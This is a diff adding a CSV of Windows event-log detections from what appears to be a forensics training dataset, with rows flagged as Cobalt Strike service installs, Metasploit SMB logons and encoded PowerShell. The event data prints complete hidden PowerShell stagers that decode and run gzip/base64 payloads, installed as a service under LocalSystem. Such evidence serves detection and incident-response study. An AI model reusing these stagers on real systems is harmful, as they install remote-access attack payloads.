@@ -1,0 +1,374 @@
+timestamp,detections,path,count,Event.System.Provider,Event ID,Record ID,Computer,Event Data
+2021-04-21T14:56:43.234146+00:00,CobaltStrike Service Installations - Security;PowerShell Scripts Installed as Services - Security,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\10.evtx,1,Microsoft-Windows-Security-Auditing,4697,354577,srvdefender01.offsec.lan,"SubjectDomainName: OFFSEC
+ServiceStartType: 3
+ServiceType: '0x10'
+SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111
+ServiceName: iOWamcEn
+ServiceFileName: '%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b=''powershell.exe''}else{$b=$env:windir+''\syswow64\WindowsPowerShell\v1.0\powershell.exe''};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=''-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=''Hidden'';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""'
+SubjectLogonId: '0x1659379'
+SubjectUserName: admmig
+ServiceAccount: LocalSystem
+"
+2021-04-21T14:56:43.246337+00:00,Base64 Encoded PowerShell Command Detected;Gzip Archive Decode Via PowerShell;Suspicious FromBase64String Usage On Gzip Archive - Process Creation,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\10.evtx,1,Microsoft-Windows-Security-Auditing,4688,354578,srvdefender01.offsec.lan,"TokenElevationType: '%%1936'
+TargetDomainName: '-'
+NewProcessId: '0x1510'
+SubjectLogonId: '0x3e7'
+ParentProcessName: C:\Windows\System32\services.exe
+TargetLogonId: '0x0'
+NewProcessName: C:\Windows\System32\cmd.exe
+SubjectDomainName: OFFSEC
+SubjectUserSid: S-1-5-18
+ProcessId: '0x238'
+CommandLine: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
+TargetUserName: '-'
+MandatoryLabel: S-1-16-16384
+SubjectUserName: SRVDEFENDER01$
+TargetUserSid: S-1-0-0
+"
+2021-04-21T14:56:43.280332+00:00,Base64 Encoded PowerShell Command Detected;Gzip Archive Decode Via PowerShell;Suspicious FromBase64String Usage On Gzip Archive - Process Creation,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\10.evtx,1,Microsoft-Windows-Security-Auditing,4688,354579,srvdefender01.offsec.lan,"TokenElevationType: '%%1936'
+TargetDomainName: '-'
+NewProcessId: '0x1140'
+SubjectLogonId: '0x3e7'
+ParentProcessName: C:\Windows\System32\cmd.exe
+TargetLogonId: '0x0'
+NewProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+SubjectDomainName: OFFSEC
+SubjectUserSid: S-1-5-18
+ProcessId: '0x1510'
+CommandLine: powershell.exe  -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
+TargetUserName: '-'
+MandatoryLabel: S-1-16-16384
+SubjectUserName: SRVDEFENDER01$
+TargetUserSid: S-1-0-0
+"
+2021-04-21T14:56:46.597935+00:00,Base64 Encoded PowerShell Command Detected;Gzip Archive Decode Via PowerShell;Suspicious FromBase64String Usage On Gzip Archive - Process Creation,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\10.evtx,1,Microsoft-Windows-Security-Auditing,4688,354598,srvdefender01.offsec.lan,"TokenElevationType: '%%1936'
+TargetDomainName: '-'
+NewProcessId: '0x13b8'
+SubjectLogonId: '0x3e7'
+ParentProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetLogonId: '0x0'
+NewProcessName: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+SubjectDomainName: OFFSEC
+SubjectUserSid: S-1-5-18
+ProcessId: '0x1140'
+CommandLine: '""C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe"" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'
+TargetUserName: '-'
+MandatoryLabel: S-1-16-16384
+SubjectUserName: SRVDEFENDER01$
+TargetUserSid: S-1-0-0
+"
+2021-04-22T08:51:04.686763+00:00,Metasploit SMB Authentication,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\02.evtx,1,Microsoft-Windows-Security-Auditing,4624,435113,fs03vuln.offsec.lan,"AuthenticationPackageName: NTLM
+LogonProcessName: 'NtLmSsp '
+IpAddress: 10.23.123.11
+KeyLength: 0
+TargetDomainName: OFFSEC
+SubjectLogonId: '0x0'
+TargetLogonId: '0x74872'
+LogonGuid: 00000000-0000-0000-0000-000000000000
+SubjectDomainName: '-'
+LogonType: 3
+WorkstationName: 0Konuy9q8HtkWeKS
+SubjectUserSid: S-1-0-0
+TransmittedServices: '-'
+ProcessId: '0x0'
+IpPort: '41747'
+ImpersonationLevel: '%%1833'
+TargetUserName: admmig
+ProcessName: '-'
+LmPackageName: NTLM V2
+SubjectUserName: '-'
+TargetUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111
+"
+2021-04-22T08:51:04.851518+00:00,Base64 Encoded PowerShell Command Detected;Gzip Archive Decode Via PowerShell;Suspicious FromBase64String Usage On Gzip Archive - Process Creation,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\02.evtx,1,Microsoft-Windows-Security-Auditing,4688,435121,fs03vuln.offsec.lan,"SubjectDomainName: OFFSEC
+TokenElevationType: '%%1936'
+SubjectUserSid: S-1-5-18
+ProcessId: '0x6e8'
+NewProcessId: '0x7f0'
+CommandLine: powershell.exe  -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
+SubjectLogonId: '0x3e7'
+SubjectUserName: FS03VULN$
+NewProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+"
+2021-04-22T08:51:04.851518+00:00,Base64 Encoded PowerShell Command Detected;Gzip Archive Decode Via PowerShell;Suspicious FromBase64String Usage On Gzip Archive - Process Creation,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\02.evtx,1,Microsoft-Windows-Security-Auditing,4688,435120,fs03vuln.offsec.lan,"SubjectDomainName: OFFSEC
+TokenElevationType: '%%1936'
+SubjectUserSid: S-1-5-18
+ProcessId: '0x1d0'
+NewProcessId: '0x6e8'
+CommandLine: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
+SubjectLogonId: '0x3e7'
+SubjectUserName: FS03VULN$
+NewProcessName: C:\Windows\System32\cmd.exe
+"
